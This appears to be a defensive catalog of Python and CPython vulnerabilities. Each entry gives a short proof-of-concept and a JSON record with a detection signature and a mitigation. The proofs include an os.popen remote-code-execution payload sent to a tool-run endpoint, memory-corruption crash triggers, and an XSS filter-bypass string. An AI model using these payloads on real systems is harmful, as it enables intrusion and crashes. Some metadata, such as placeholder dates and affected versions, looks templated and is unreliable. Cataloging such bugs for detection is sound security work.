**Risk**: Safe AST-based type resolver retained an `eval()` fallback behind `allow_unsafe_eval`, hardcoded to `True` in sandbox execution paths.

```python
# POST /v1/tools/run
{
  "source_code": "def rce_tool(data: __import__(\"os\").popen(\"id > /tmp/pwned\").read()) -> str: return str(data)",
  "name": "rce_tool",
  "args": {"data": "test"},
  "source_type": "python"
}
# ast.parse() succeeds, _resolve_annotation_node() fails (ast.Call not supported)
# eval(annotation_str, python_types) executes arbitrary code
```
**Ref**: Letta CVE-2025-6101 (YLChen-007, March 2026).

```json
{
  "sink_id": "RCE-001",
  "category": "RCE",
  "title": "Unsafe eval() fallback in AST type resolver sandbox path",
  "severity": "critical",
  "affected_versions": ["3.10+", "3.11+", "3.12+", "3.13+"],
  "sources": [
    {
      "type": "security_advisory",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-6101",
      "title": "CVE-2025-6101",
      "author": "NVD",
      "date": "2026-03-01",
      "cve_id": "CVE-2025-6101",
      "verified": true,
      "tags": ["eval", "sandbox", "annotation", "rce", "letta"]
    }
  ],
  "related_cves": ["CVE-2025-6101"],
  "related_issues": [],
  "detection_signature": "eval\\\\(annotation_str,\\\\s*python_types\\\\)",
  "mitigation": "Remove eval()-based fallback or gate it behind an explicit disabled-by-default trust boundary.",
  "confidence": "likely"
}
```

### UAF in `_Py_typing_type_repr` — Re-entrant `__origin__`
**Risk**: `types.GenericAlias.__repr__` walks type arguments using borrowed pointers. A crafted `__getattr__` clears the shared list when `_Py_typing_type_repr` probes `__origin__`.

```python
import types
class Zap:
    __slots__ = ("container",)
    def __init__(self, container):
        self.container = container
    def __getattr__(self, name):
        if name == "__origin__":
            self.container.clear()
            return None
        raise AttributeError

params = []
params.append(Zap(params))
alias = types.GenericAlias(list, (params,))
repr(alias)  # UAF crash
```
**Ref**: CPython Issue #143635 (Jan 2026).

```json
{
  "sink_id": "CPYTHON-001",
  "category": "CPYTHON",
  "title": "Use-after-free in _Py_typing_type_repr via re-entrant __origin__ access",
  "severity": "high",
  "affected_versions": ["3.13", "3.14-dev"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/143635",
      "title": "CPython Issue #143635",
      "author": "python/cpython",
      "date": "2026-01-01",
      "gh_issue": "python/cpython#143635",
      "verified": true,
      "tags": ["uaf", "genericalias", "typing", "repr", "reentrancy"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#143635"],
  "detection_signature": "types\\\\.GenericAlias\\\\(|def __getattr__\\\\(self, name\\\\):",
  "mitigation": "Avoid re-entrant attribute lookups on attacker-controlled typing operands during repr construction.",
  "confidence": "likely"
}
```

### Turing-Complete Type Hints — Subtype Metaprogramming (MapleCTF 2023)
**Risk**: Python type hints via `mypy` are Turing complete. Recursive generic class definitions create infinite subtype queries that encode computation.

```python
from typing import TypeVar, Generic
z = TypeVar("z", contravariant=True)
class N(Generic[z]): ...
class C(Generic[x], N[N["C[C[x]]"]]): ...
# Subtype query CT <: NCU triggers infinite expansion
```
**Ref**: Roth, Ori. 2023. *Python Type Hints Are Turing Complete*.

```json
{
  "sink_id": "CLASS-001",
  "category": "CLASS",
  "title": "Turing-complete subtype metaprogramming in Python type hints",
  "severity": "medium",
  "affected_versions": ["3.8+", "3.9+", "3.10+", "3.11+", "3.12+", "3.13+"],
  "sources": [
    {
      "type": "research_paper",
      "url": "https://raw.githubusercontent.com/maple3142/imaginaryCTF-solution/master/MapleCTF-2023/Python%20Type%20Hints%20Are%20Turing%20Complete.pdf",
      "title": "Python Type Hints Are Turing Complete",
      "author": "Ori Roth",
      "date": "2023-01-01",
      "verified": true,
      "tags": ["type-hints", "mypy", "metaprogramming", "dos", "maplectf"]
    }
  ],
  "related_cves": [],
  "related_issues": [],
  "detection_signature": "TypeVar\\\\(|Generic\\\\[.*\"C\\\\[C\\\\[x\\\\]\\\\]\"",
  "mitigation": "Bound type-checker recursion and treat untrusted type programs as potentially adversarial inputs.",
  "confidence": "likely"
}
```

### ContextVar Re-entrant UAF in `Context.__eq__`
**Risk**: Re-entrant `ContextVar.set()` during `_PyHamt_Eq` lets `Context.__eq__` replace a context while `hamt_iterator_next` still walks old HAMT nodes.

```python
import contextvars
var = contextvars.ContextVar("v")
ctx1 = contextvars.Context()
ctx2 = contextvars.Context()

class Boom:
    def __eq__(self, other):
        ctx1.run(lambda: var.set(object()))
        return True

ctx1.run(var.set, Boom())
ctx2.run(var.set, object())
ctx1 == ctx2  # UAF trigger
```
**Ref**: CPython Issue #142829.

```json
{
  "sink_id": "CPYTHON-002",
  "category": "CPYTHON",
  "title": "Re-entrant Context.__eq__ causes HAMT iterator use-after-free",
  "severity": "high",
  "affected_versions": ["3.12", "3.13", "3.14-dev"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/142829",
      "title": "CPython Issue #142829",
      "author": "python/cpython",
      "date": "2025-01-01",
      "gh_issue": "python/cpython#142829",
      "verified": true,
      "tags": ["contextvars", "uaf", "hamt", "reentrancy"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#142829"],
  "detection_signature": "class .*__eq__\\\\(self, other\\\\):.*ContextVar\\\\.set",
  "mitigation": "Do not permit structure mutation during HAMT equality traversal; hold strong references across callbacks.",
  "confidence": "likely"
}
```

### asyncio.Task UAF via Malicious `__getattribute__`
**Risk**: `task->task_cancel_msg` missing incref before usage. Malicious `__getattribute__` frees the object before `cancel()` uses it.

```python
class Evil:
    def __getattribute__(self, name):
        if name == "cancel":
            task.__init__(coro, loop=loop, name=Break())
            del to_uaf  # Frees object
        return object.__getattribute__(self, name)
```
**Ref**: CPython Issue #126138.

```json
{
  "sink_id": "ASYNC-001",
  "category": "ASYNC",
  "title": "asyncio.Task cancel path use-after-free via malicious __getattribute__",
  "severity": "high",
  "affected_versions": ["3.12", "3.13"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/126138",
      "title": "CPython Issue #126138",
      "author": "python/cpython",
      "date": "2024-01-01",
      "gh_issue": "python/cpython#126138",
      "verified": true,
      "tags": ["asyncio", "task", "uaf", "getattribute", "cancel"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#126138"],
  "detection_signature": "def __getattribute__\\\\(self, name\\\\):.*task\\\\.__init__",
  "mitigation": "INCREF attacker-controlled cancel metadata before invoking Python-level hooks.",
  "confidence": "likely"
}
```

### `zoneinfo._weak_cache` DECREF Assumption UAF
**Risk**: `get_weak_cache()` incorrectly assumes `PyObject_GetAttrString()` returns a borrowed reference safe to DECREF.

```python
from zoneinfo import ZoneInfo
class BombDescriptor:
    def __get__(self, obj, owner):
        return object()  # New object each time

class EvilZoneInfo(ZoneInfo):
    pass
EvilZoneInfo._weak_cache = BombDescriptor()
EvilZoneInfo("UTC")  # UAF
```
**Ref**: CPython Issue #142783.

```json
{
  "sink_id": "STDLIB-001",
  "category": "STDLIB",
  "title": "zoneinfo weak cache descriptor confusion leads to use-after-free",
  "severity": "high",
  "affected_versions": ["3.11", "3.12", "3.13"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/142783",
      "title": "CPython Issue #142783",
      "author": "python/cpython",
      "date": "2025-01-01",
      "gh_issue": "python/cpython#142783",
      "verified": true,
      "tags": ["zoneinfo", "weak_cache", "descriptor", "uaf"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#142783"],
  "detection_signature": "_weak_cache\\\\s*=\\\\s*BombDescriptor\\\\(\\\\)",
  "mitigation": "Treat _weak_cache lookups as owned references and validate descriptor return types.",
  "confidence": "likely"
}
```

### `gc.get_referrers()` Type Cache Corruption → Segfault
**Risk**: `gc.get_referrers()` exposes the underlying dictionary of a class's `__dict__` mapping proxy. Direct modification invalidates the type cache without synchronization.

```python
import gc
class Cls:
    var = []
for ref in gc.get_referrers(Cls.var):
    del ref['var']
gc.collect()
print(Cls.var)  # Segfault
```
**Ref**: CPython Issue #113631 (Jan 2024).

```json
{
  "sink_id": "STDLIB-002",
  "category": "STDLIB",
  "title": "gc.get_referrers exposes mutable class dict leading to type cache corruption",
  "severity": "high",
  "affected_versions": ["3.11", "3.12"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/113631",
      "title": "CPython Issue #113631",
      "author": "python/cpython",
      "date": "2024-01-01",
      "gh_issue": "python/cpython#113631",
      "verified": true,
      "tags": ["gc", "get_referrers", "type-cache", "segfault"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#113631"],
  "detection_signature": "gc\\\\.get_referrers\\\\(.*\\\\).*del ref\\\\['var'\\\\]",
  "mitigation": "Do not expose mutable internals of type dicts through gc inspection APIs.",
  "confidence": "likely"
}
```

### Property Subclass `__new__` Returns Non-Property → Segfault
**Risk**: `property_copy()` casts return value to `propertyobject*` without type checking.

```python
class pro(property):
    def __new__(typ, *args, **kwargs):
        return "abcdef"

p = property.__new__(pro)
p.__set_name__(A, 1)
np = p.getter(lambda self: 1)  # SEGFAULT
```
**Ref**: CPython Issue #100942 (Jan 2023).

```json
{
  "sink_id": "CPYTHON-003",
  "category": "CPYTHON",
  "title": "property_copy trusts subclass __new__ returning non-property object",
  "severity": "high",
  "affected_versions": ["3.10", "3.11", "3.12"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/100942",
      "title": "CPython Issue #100942",
      "author": "python/cpython",
      "date": "2023-01-01",
      "gh_issue": "python/cpython#100942",
      "verified": true,
      "tags": ["property", "type-confusion", "segfault", "__new__"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#100942"],
  "detection_signature": "class .*\\\\(property\\\\):.*def __new__",
  "mitigation": "Validate returned object type before casting results from property subclass constructors.",
  "confidence": "likely"
}
```

### Custom Metaclass MRO → Double-Free Crash
**Risk**: Metaclass `mro()` deletes itself during execution. `type_mro_modified()` double-frees `mro_meth`.

```python
class M(type):
    def mro(cls):
        del M.mro
        return (B,)
class C(metaclass=M):
    pass  # Crash
```
**Ref**: CPython Issue #92112 (May 2022).

```json
{
  "sink_id": "CLASS-002",
  "category": "CLASS",
  "title": "Metaclass mro() self-deletion triggers double-free in type_mro_modified",
  "severity": "high",
  "affected_versions": ["3.9", "3.10", "3.11"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/92112",
      "title": "CPython Issue #92112",
      "author": "python/cpython",
      "date": "2022-05-01",
      "gh_issue": "python/cpython#92112",
      "verified": true,
      "tags": ["metaclass", "mro", "double-free", "class-creation"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#92112"],
  "detection_signature": "def mro\\\\(cls\\\\):\\n\\\\s*del .*mro",
  "mitigation": "Snapshot metaclass method references before invoking dynamic MRO hooks.",
  "confidence": "likely"
}
```

### `__init_subclass__` MRO Skip Bug
**Risk**: When a metaclass creates a class with unusual MRO, `__init_subclass__` is incorrectly skipped due to `super(Subclass, Subclass).__init_subclass__()`.

```python
class SecurityMixin:
    def __init_subclass__(cls, **kwargs):
        if not hasattr(cls, 'security_token'):
            raise SecurityError("No token")
        super().__init_subclass__(**kwargs)

class Metaclass(type):
    def mro(cls):
        return [SecurityMixin, cls, object]

class MyClass(metaclass=Metaclass):
    pass  # SecurityMixin.__init_subclass__ NOT called!
```
**Ref**: CPython Issue #105038 (May 2023).

```json
{
  "sink_id": "CLASS-003",
  "category": "CLASS",
  "title": "Unusual metaclass MRO can skip security-relevant __init_subclass__ hooks",
  "severity": "medium",
  "affected_versions": ["3.10", "3.11", "3.12"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/105038",
      "title": "CPython Issue #105038",
      "author": "python/cpython",
      "date": "2023-05-01",
      "gh_issue": "python/cpython#105038",
      "verified": true,
      "tags": ["metaclass", "mro", "init_subclass", "policy-bypass"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#105038"],
  "detection_signature": "def __init_subclass__\\\\\\(cls, \\\\*\\\\*kwargs\\\\\\):|def mro\\\\\\(cls\\\\\\):",
  "mitigation": "Do not rely solely on __init_subclass__ for security policy enforcement when metaclasses can control MRO.",
  "confidence": "likely"
}
```

### `email.utils.parseaddr()` — Email Address Bypass (CVE-2023-27043)
**Risk**: Incorrectly parses malformed RFC2822 addresses. Real Name portion returned in Email Address field.

```python
from email.utils import parseaddr
parseaddr("admin@company.example.com<attacker@gmail.com>")
# Returns: ('', 'admin@company.example.com<attacker@gmail.com>') — parser confusion
```
**Ref**: CPython Issue #102988.

```json
{
  "sink_id": "PROTOCOL-001",
  "category": "PROTOCOL",
  "title": "email.utils.parseaddr accepts malformed address payloads",
  "severity": "medium",
  "affected_versions": ["3.8", "3.9", "3.10", "3.11"],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-27043",
      "title": "CVE-2023-27043",
      "author": "NVD",
      "date": "2023-03-01",
      "cve_id": "CVE-2023-27043",
      "verified": true,
      "tags": ["email", "parser", "validation-bypass", "rfc2822"]
    }
  ],
  "related_cves": ["CVE-2023-27043"],
  "related_issues": ["python/cpython#102988"],
  "detection_signature": "parseaddr\\\\(\".*<.*@.*>\"\\\\)",
  "mitigation": "Use strict email validation and reject parser-confused mixed-name/address forms.",
  "confidence": "confirmed"
}
```

### `hmac.compare_digest()` — Compiler-Optimized Timing Channel (CVE-2022-48566)
**Risk**: Pure-Python implementation used non-volatile accumulator that compilers could optimize into early-exit behavior.

```python
import time, hmac
def time_compare(secret, guess):
    start = time.perf_counter()
    hmac.compare_digest(secret, guess)
    return time.perf_counter() - start
# Longer time = more bytes matched = timing oracle
```
**Ref**: CPython Issue #84968.

```json
{
  "sink_id": "STDLIB-003",
  "category": "STDLIB",
  "title": "Pure-Python hmac.compare_digest vulnerable to compiler-optimized timing leakage",
  "severity": "medium",
  "affected_versions": ["3.10", "3.11"],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-48566",
      "title": "CVE-2022-48566",
      "author": "NVD",
      "date": "2023-10-01",
      "cve_id": "CVE-2022-48566",
      "verified": true,
      "tags": ["hmac", "timing", "side-channel", "compare_digest"]
    }
  ],
  "related_cves": ["CVE-2022-48566"],
  "related_issues": ["python/cpython#84968"],
  "detection_signature": "hmac\\\\.compare_digest\\\\(",
  "mitigation": "Prefer constant-time C-backed comparisons and avoid fallback implementations susceptible to compiler rewrites.",
  "confidence": "confirmed"
}
```

### `html.parser.HTMLParser` — Comment Parsing XSS Bypass
**Risk**: Does not correctly parse HTML comments containing `--!>`. Attackers smuggle `<script>` tags past whitelist filters.

```python
from html.parser import HTMLParser
parser = HTMLParser()
parser.feed('<!--!> <h1 value="--!><script>alert(1)</script>')
# Parser sees NO start tag for <script>
```
**Ref**: CPython Issue #102555.

```json
{
  "sink_id": "PROTOCOL-002",
  "category": "PROTOCOL",
  "title": "HTMLParser comment edge case enables whitelist-filter XSS bypass",
  "severity": "medium",
  "affected_versions": ["3.8", "3.9", "3.10", "3.11"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/102555",
      "title": "CPython Issue #102555",
      "author": "python/cpython",
      "date": "2023-03-01",
      "gh_issue": "python/cpython#102555",
      "verified": true,
      "tags": ["html.parser", "xss", "comment", "filter-bypass"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#102555"],
  "detection_signature": "HTMLParser\\\\(\\\\)|--!><script>",
  "mitigation": "Do not rely on HTMLParser alone for sanitization; use a standards-compliant sanitizer.",
  "confidence": "likely"
}
```

### `configparser` — Newline Injection
**Risk**: Accepts `=` signs and newlines in section names and keys, producing files that read back differently.

```python
import configparser
cfg = configparser.ConfigParser()
cfg['section\n[evil]'] = {}
cfg['section\n[evil]']['pwned'] = 'true'
# Injects new section when written and re-read
```
**Ref**: CPython Issue #69909.

```json
{
  "sink_id": "PROTOCOL-003",
  "category": "PROTOCOL",
  "title": "configparser permits newline injection in section names and keys",
  "severity": "medium",
  "affected_versions": ["3.8", "3.9", "3.10", "3.11", "3.12"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/69909",
      "title": "CPython Issue #69909",
      "author": "python/cpython",
      "date": "2015-01-01",
      "gh_issue": "python/cpython#69909",
      "verified": true,
      "tags": ["configparser", "newline-injection", "parser-confusion", "config"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#69909"],
  "detection_signature": "cfg\\['.*\\n\\[.*\\]'\\]",
  "mitigation": "Reject control characters and delimiter-bearing section names before serializing configuration files.",
  "confidence": "likely"
}
```
